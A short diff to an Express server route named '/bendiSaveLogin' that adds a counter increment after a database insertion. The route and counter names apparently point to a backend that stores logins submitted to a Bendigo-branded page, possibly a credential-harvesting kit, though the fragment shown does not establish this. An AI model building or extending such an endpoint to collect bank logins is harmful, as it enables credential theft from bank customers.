@@ -131,6 +131,7 @@ app.post("/bendiSaveLogin", cors(), (req, res) => {
       if (!err) res.send("Insertion Completed");
       else console.log(err);
     });
+    bendigoCountSkii += 1
   }
 });
 
